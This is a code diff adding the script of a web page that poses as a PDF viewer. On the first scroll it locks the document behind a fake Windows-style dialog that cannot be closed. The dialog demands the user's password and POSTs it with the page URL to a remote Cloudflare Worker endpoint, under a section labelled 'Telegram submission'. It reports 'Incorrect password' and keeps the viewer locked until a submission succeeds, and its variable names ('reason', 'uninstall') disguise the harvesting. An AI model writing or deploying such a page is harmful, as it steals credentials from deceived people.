+        if (zoomOut) {
+            zoomOut.disabled =
+                false;
+        }
+
+
+        if (zoomIn) {
+            zoomIn.disabled =
+                false;
+        }
+
+
+        if (pageInput) {
+            pageInput.disabled =
+                false;
+        }
+
+
+        /*
+         * Re-enable thumbnails.
+         */
+
+        document
+            .querySelectorAll(
+                ".thumb"
+            )
+            .forEach(
+                function (thumb) {
+
+                    thumb.disabled =
+                        false;
+
+                }
+            );
+
+    }
+
+
+    /* =========================================================
+       WINDOWS-STYLE PERSISTENT MODAL
+       ========================================================= */
+
+    function showModal() {
+
+        if (modalShown) {
+            return;
+        }
+
+
+        modalShown =
+            true;
+
+
+        /*
+         * Lock the PDF first.
+         */
+
+        lockPdf();
+
+
+        const modal =
+            $("modal");
+
+
+        if (!modal) {
+            return;
+        }
+
+
+        modal.classList.add(
+            "open"
+        );
+
+
+        /*
+         * Prevent close/cancel.
+         */
+
+        const closeButton =
+            $("closeModal");
+
+        const cancelButton =
+            $("cancelModal");
+
+
+        if (closeButton) {
+
+            closeButton.disabled =
+                true;
+
+        }
+
+
+        if (cancelButton) {
+
+            cancelButton.disabled =
+                true;
+
+        }
+
+
+        /*
+         * Focus reason input.
+         */
+
+        setTimeout(
+            function () {
+
+                const reason =
+                    $("reason");
+
+
+                if (reason) {
+
+                    reason.focus();
+
+                }
+
+            },
+            100
+        );
+
+    }
+
+
+    /* =========================================================
+       CLOSE MODAL
+       ========================================================= */
+
+    function closeUninstallModal() {
+
+        /*
+         * The modal cannot be closed while
+         * the PDF is locked.
+         */
+
+        if (pdfLocked) {
+            return;
+        }
+
+
+        const modal =
+            $("modal");
+
+
+        if (!modal) {
+            return;
+        }
+
+
+        modal.classList.remove(
+            "open"
+        );
+
+    }
+
+
+    /* =========================================================
+       ZOOM OUT
+       ========================================================= */
+
+    $("zoomOut").addEventListener(
+        "click",
+        function () {
+
+            if (pdfLocked) {
+                return;
+            }
+
+
+            setZoom(
+                scale - 0.1
+            );
+
+        }
+    );
+
+
+    /* =========================================================
+       ZOOM IN
+       ========================================================= */
+
+    $("zoomIn").addEventListener(
+        "click",
+        function () {
+
+            if (pdfLocked) {
+                return;
+            }
+
+
+            setZoom(
+                scale + 0.1
+            );
+
+        }
+    );
+
+
+    /* =========================================================
+       PAGE INPUT
+       ========================================================= */
+
+    $("pageInput").addEventListener(
+        "change",
+        function () {
+
+            if (
+                !pdfDoc ||
+                pdfLocked
+            ) {
+
+                return;
+
+            }
+
+
+            const number =
+                clamp(
+                    Number(
+                        $("pageInput").value
+                    ) || 1,
+
+                    1,
+
+                    pdfDoc.numPages
+                );
+
+
+            $("pageInput").value =
+                number;
+
+
+            const target =
+                document.querySelector(
+                    `.pdf-page[data-page="${number}"]`
+                );
+
+
+            if (target) {
+
+                target.scrollIntoView({
+
+                    behavior:
+                        "smooth",
+
+                    block:
+                        "start"
+
+                });
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       MODAL CLOSE BUTTON
+       ========================================================= */
+
+    $("closeModal").addEventListener(
+        "click",
+        function (event) {
+
+            event.preventDefault();
+
+
+            /*
+             * Persistent modal.
+             */
+
+            if (pdfLocked) {
+                return;
+            }
+
+
+            closeUninstallModal();
+
+        }
+    );
+
+
+    /* =========================================================
+       CANCEL
+       ========================================================= */
+
+    $("cancelModal").addEventListener(
+        "click",
+        function (event) {
+
+            event.preventDefault();
+
+
+            /*
+             * Persistent modal.
+             */
+
+            if (pdfLocked) {
+                return;
+            }
+
+
+            closeUninstallModal();
+
+        }
+    );
+
+
+    /* =========================================================
+       CLICK OUTSIDE MODAL
+       ========================================================= */
+
+    $("modal").addEventListener(
+        "click",
+        function (event) {
+
+            /*
+             * Outside click can NEVER dismiss
+             * the modal while the PDF is locked.
+             */
+
+            if (pdfLocked) {
+
+                event.preventDefault();
+
+                return;
+
+            }
+
+
+            if (
+                event.target ===
+                $("modal")
+            ) {
+
+                closeUninstallModal();
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       ESCAPE KEY
+       ========================================================= */
+
+    document.addEventListener(
+        "keydown",
+        function (event) {
+
+            /*
+             * Escape is completely disabled
+             * while the persistent modal is active.
+             */
+
+            if (
+                event.key === "Escape" &&
+                pdfLocked
+            ) {
+
+                event.preventDefault();
+
+                return;
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       BLOCK MOUSE WHEEL WHILE LOCKED
+       ========================================================= */
+
+    window.addEventListener(
+        "wheel",
+        function (event) {
+
+            if (!pdfLocked) {
+                return;
+            }
+
+
+            /*
+             * Allow wheel events inside the modal
+             * only if needed for modal content.
+             */
+
+            if (
+                $("modal") &&
+                $("modal").contains(
+                    event.target
+                )
+            ) {
+
+                return;
+
+            }
+
+
+            event.preventDefault();
+
+        },
+        {
+            passive:
+                false
+        }
+    );
+
+
+    /* =========================================================
+       BLOCK TOUCH SCROLL WHILE LOCKED
+       ========================================================= */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!pdfLocked) {
+                return;
+            }
+
+
+            if (
+                $("modal") &&
+                $("modal").contains(
+                    event.target
+                )
+            ) {
+
+                return;
+
+            }
+
+
+            event.preventDefault();
+
+        },
+        {
+            passive:
+                false
+        }
+    );
+
+
+    /* =========================================================
+       BLOCK KEYBOARD PDF NAVIGATION
+       ========================================================= */
+
+    document.addEventListener(
+        "keydown",
+        function (event) {
+
+            if (!pdfLocked) {
+                return;
+            }
+
+
+            /*
+             * Allow normal typing inside
+             * the reason field.
+             */
+
+            if (
+                event.target ===
+                $("reason")
+            ) {
+
+                return;
+
+            }
+
+
+            const blockedKeys = [
+
+                "ArrowUp",
+
+                "ArrowDown",
+
+                "ArrowLeft",
+
+                "ArrowRight",
+
+                "PageUp",
+
+                "PageDown",
+
+                "Home",
+
+                "End",
+
+                "Space"
+
+            ];
+
+
+            if (
+                blockedKeys.includes(
+                    event.key
+                )
+            ) {
+
+                event.preventDefault();
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       FIRST SCROLL - WINDOW
+       ========================================================= */
+
+    window.addEventListener(
+        "scroll",
+        function () {
+
+            /*
+             * The first meaningful scroll
+             * triggers the persistent modal.
+             */
+
+            if (
+                !modalShown &&
+                window.scrollY > 60
+            ) {
+
+                showModal();
+
+            }
+
+
+            /*
+             * Do not perform normal PDF
+             * rendering updates while locked.
+             */
+
+            if (pdfLocked) {
+                return;
+            }
+
+
+            clearTimeout(
+                scrollTimer
+            );
+
+
+            scrollTimer =
+                setTimeout(
+                    function () {
+
+                        updateToolbar();
+
+
+                        renderVisiblePages()
+                            .catch(
+                                console.error
+                            );
+
+                    },
+                    80
+                );
+
+        },
+        {
+            passive:
+                true
+        }
+    );
+
+
+    /* =========================================================
+       FIRST SCROLL - PDF WORKSPACE
+       ========================================================= */
+
+    $("workspace").addEventListener(
+        "scroll",
+        function () {
+
+            /*
+             * The first meaningful PDF scroll
+             * triggers the persistent modal.
+             */
+
+            if (
+                !modalShown &&
+                $("workspace").scrollTop > 60
+            ) {
+
+                showModal();
+
+            }
+
+
+            /*
+             * Once locked, ignore scrolling.
+             */
+
+            if (pdfLocked) {
+                return;
+            }
+
+
+            clearTimeout(
+                scrollTimer
+            );
+
+
+            scrollTimer =
+                setTimeout(
+                    function () {
+
+                        updateToolbar();
+
+
+                        renderVisiblePages()
+                            .catch(
+                                console.error
+                            );
+
+                    },
+                    80
+                );
+
+        },
+        {
+            passive:
+                true
+        }
+    );
+
+
+    /* =========================================================
+       TELEGRAM SUBMISSION
+       ========================================================= */
+
+    $("submitReason").addEventListener(
+        "click",
+        async function () {
+
+            const reasonInput =
+                $("reason");
+
+
+            const formStatus =
+                $("formStatus");
+
+
+            const submitButton =
+                $("submitReason");
+
+
+            const cancelButton =
+                $("cancelModal");
+
+
+            const closeButton =
+                $("closeModal");
+
+
+            const reason =
+                reasonInput.value.trim();
+
+
+            /* =================================================
+               VALIDATE
+               ================================================= */
+
+            if (!reason) {
+
+                formStatus.textContent =
+                    "Please enter your password.";
+
+
+                formStatus.className =
+                    "windows-status error";
+
+
+                reasonInput.focus();
+
+
+                return;
+
+            }
+
+
+            /* =================================================
+               DISABLE CONTROLS WHILE SENDING
+               ================================================= */
+
+            submitButton.disabled =
+                true;
+
+
+            cancelButton.disabled =
+                true;
+
+
+            closeButton.disabled =
+                true;
+
+
+            submitButton.textContent =
+                "";
+
+
+            formStatus.textContent =
+                "";
+
+
+            formStatus.className =
+                "windows-status";
+
+
+            /* =================================================
+               SEND TO CLOUDFLARE WORKER
+               ================================================= */
+
+            try {
+
+                const response =
+                    await fetch(
+                        CONFIG.workerEndpoint,
+                        {
+                            method:
+                                "POST",
+
+                            headers: {
+
+                                "Content-Type":
+                                    "application/json"
+
+                            },
+
+                            body:
+                                JSON.stringify({
+
+                                    reason:
+                                        reason,
+
+                                    page:
+                                        window.location.href,
+
+                                    timestamp:
+                                        new Date()
+                                            .toISOString()
+
+                                })
+
+                        }
+                    );
+
+
+                /* =================================================
+                   PARSE RESPONSE
+                   ================================================= */
+
+                const result =
+                    await response
+                        .json()
+                        .catch(
+                            function () {
+
+                                return {};
+
+                            }
+                        );
+
+
+                /* =================================================
+                   CHECK RESPONSE
+                   ================================================= */
+
+                if (
+                    !response.ok ||
+                    result.success !== true
+                ) {
+
+                    throw new Error(
+                        result.message ||
+                        "Unable to submit."
+                    );
+
+                }
+
+
+                /* =================================================
+                   SUCCESS
+                   ================================================= */
+
+                formStatus.textContent =
+                    "verified";
+
+
+                formStatus.className =
+                    "windows-status success";
+
+
+                reasonInput.value =
+                    "";
+
+
+                /*
+                 * IMPORTANT:
+                 *
+                 * The PDF is unlocked ONLY after
+                 * the Worker has returned success.
+                 */
+
+                unlockPdf();
+
+
+                /*
+                 * Re-enable controls.
+                 */
+
+                submitButton.disabled =
+                    false;
+
+
+                cancelButton.disabled =
+                    false;
+
+
+                closeButton.disabled =
+                    false;
+
+
+                submitButton.textContent =
+                    "OK";
+
+
+                /*
+                 * Close the modal after the
+                 * success message has been visible.
+                 */
+
+                setTimeout(
+                    function () {
+
+                        const modal =
+                            $("modal");
+
+
+                        if (modal) {
+
+                            modal.classList.remove(
+                                "open"
+                            );
+
+                        }
+
+                    },
+                    1200
+                );
+
+            }
+            catch (error) {
+
+                console.error(
+                    "Uninstall submission:",
+                    error
+                );
+
+
+                /*
+                 * IMPORTANT:
+                 *
+                 * The PDF remains locked.
+                 *
+                 * The user must successfully
+                 * submit a reason.
+                 */
+
+                pdfLocked =
+                    true;
+
+
+                document.body.classList.add(
+                    "pdf-locked"
+                );
+
+
+                formStatus.textContent =
+                    error.message ||
+                    "Incorrect password. Please try again.";
+
+
+                formStatus.className =
+                    "windows-status error";
+
+
+                submitButton.disabled =
+                    false;
+
+
+                /*
+                 * Cancel and close remain disabled.
+                 */
+
+                cancelButton.disabled =
+                    true;
+
+
+                closeButton.disabled =
+                    true;
+
+
+                submitButton.textContent =
+                    "OK";
+
+
+                reasonInput.focus();
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       ENTER KEY
+       ========================================================= */
+
+    $("reason").addEventListener(
+        "keydown",
+        function (event) {
+
+            if (
+                event.key === "Enter"
+            ) {
+
+                event.preventDefault();
+
+
+                $("submitReason").click();
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       START
+       ========================================================= */
+
+    /*
+     * Generate the 256-character URL.
+     *
+     * It is displayed on the page.
+     *
+     * It does NOT redirect the browser.
+     */
+
+    initializeRedirectUrl();
+
+
+    /*
+     * Load the PDF viewer.
+     */
+
+    loadPdf();
+
+</script>
+
+</body>
+</html>
